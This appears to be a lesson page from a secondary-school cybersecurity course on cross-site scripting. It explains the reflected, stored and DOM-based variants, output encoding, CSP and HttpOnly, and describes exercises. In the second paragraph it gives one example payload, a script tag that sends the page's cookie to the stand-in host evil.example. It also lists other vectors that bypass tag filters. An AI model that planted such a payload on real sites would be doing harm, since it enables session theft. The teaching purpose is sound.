# 5.1.b, Cross-site scripting (XSS)

> **Unit 5 · 5.1 Application and Data Vulnerabilities and Attacks**
> **AP Learning Objective(s):** 5.1.A, 5.1.B
> **Course skill(s):** Analyze Risk

## Learning objective (student-facing)
Explain how cross-site scripting (XSS) lets an attacker inject
and run malicious script in another user's browser, identify the three main XSS variants, and
recognize the input-handling mistakes that make an application vulnerable.

## Lesson
A web application usually takes input from one user (a comment, a search term, a profile field)
and displays it back, to that user, to an admin, or to every visitor. **Cross-site scripting
(XSS)** happens when an application includes untrusted input in a page it sends to a browser
*without properly neutralizing it first*. If the input contains HTML or JavaScript, the browser
does not know it came from an attacker, it just renders it, exactly like it renders text the
developer wrote. The attacker's script now runs with the same trust and access as the real page:
it can read cookies and session tokens, make requests as the logged-in victim, deface the page,
log keystrokes, or silently redirect the user to a phishing clone.

XSS is fundamentally a **failure to separate data from code**. A web page is built by mixing
fixed markup (written by the developer) with variable content (submitted by users). If that
variable content is dropped into the HTML stream unescaped, a string like
`<script>document.location='https://evil.example/steal?c='+document.cookie</script>` stops being
"just text" and becomes an executable instruction the browser obeys.

There are three classic variants, and the AP framework expects you to tell them apart:

**Reflected XSS.** The malicious script arrives in the request itself, typically a URL parameter, and the server immediately echoes it back into the response, unescaped. The victim has to be
tricked into clicking a crafted link (often via phishing or a shortened URL) for the payload to
fire; the attack is not stored anywhere. Example: a search page that prints "You searched for:
`<user input>`" directly into the results page.

**Stored (persistent) XSS.** The payload is saved on the server, in a database, a comment field,
a user profile, a support ticket, and then served to *every* user who later views that page.
Stored XSS is more dangerous because it needs no social-engineering step: any visitor who loads
the infected page is compromised automatically, including administrators who might have elevated
session privileges.

**DOM-based XSS.** The vulnerability lives entirely in client-side JavaScript. The page's own
script takes data from an untrusted source (the URL fragment, `document.referrer`, a form field)
and writes it into the page using an unsafe sink such as `innerHTML` or `document.write`, without
the data ever touching the server at all. This variant can hide from server-side filters because
the server never sees the malicious value.

The root defense against all three variants is **output encoding (escaping)**: before untrusted
data is placed into HTML, it must be converted so special characters like `<`, `>`, `"`, and `'`
render as literal text instead of being interpreted as markup, e.g., `<` becomes `&lt;`. Modern
frameworks (React, Vue, Django templates) escape by default, which is why "always escape on
output, not just on input" is the standard guidance: input validation alone is not enough, because
the same string can be safe in one context (a plain-text field) and dangerous in another (rendered
into HTML). Other layers of defense include a **Content-Security-Policy (CSP)** header that
restricts which scripts a browser will execute, and marking session cookies `HttpOnly` so
JavaScript cannot read them even if a payload does execute.

The coding problem in this skill mirrors that first line of defense: you will build a function that
scans a string of user-submitted content and decides whether it is safe to render or must be
sanitized/escaped, based on dangerous markup patterns. The simulation lets you play both roles, type payloads into a deliberately vulnerable mock comment box and watch (safely, in a sandboxed
fake DOM) whether they would have executed, and how output encoding neutralizes them.

## Key terms
- **Cross-site scripting (XSS)**, injecting attacker-controlled script into a page viewed by
  other users, by exploiting unescaped output of untrusted input.
- **Reflected XSS**, payload delivered via the request (e.g., URL parameter) and echoed
  immediately in the response; requires tricking the victim into a crafted link.
- **Stored XSS**, payload saved server-side and served to every subsequent viewer.
- **DOM-based XSS**, payload never reaches the server; client-side script writes untrusted data
  into an unsafe DOM sink.
- **Output encoding / escaping**, converting special characters (`<`, `>`, `"`, `'`, `&`) to
  their literal-text equivalents before placing data into HTML.

## Common misconceptions
- "Filtering `<script>` tags is enough." → Attackers use countless other vectors (`onerror=`,
  `javascript:` URLs, SVG, `<img>` tags), deny-listing tags is easily bypassed; escaping output is
  the reliable fix.
- "XSS only matters if the attacker can guess a password." → XSS runs in the *victim's already
  authenticated* browser session, no password is needed, it hijacks trust that already exists.

## Try it
- **Simulation:** Test payloads against a mock vulnerable and a
  mock hardened input field and correctly predict/observe whether each payload would execute.
- **Coding problem:** Build a function that detects whether a piece of user content
  contains a dangerous (unescaped-HTML) XSS pattern.
- **Quiz:** self-check on the skill's key ideas.

## Sources (local / vendor / rebuilt)
- Deep: OWASP (Cross-Site Scripting reference), rebuilt as original prose above.
- Reference: GeeksforGeeks (XSS overview).
- Practice: PortSwigger Web Security Academy (XSS labs) → rebuilt locally as the simulation.
- Repo: OWASP/wstg (Web Security Testing Guide) → `vendor/repos/OWASP-wstg`.
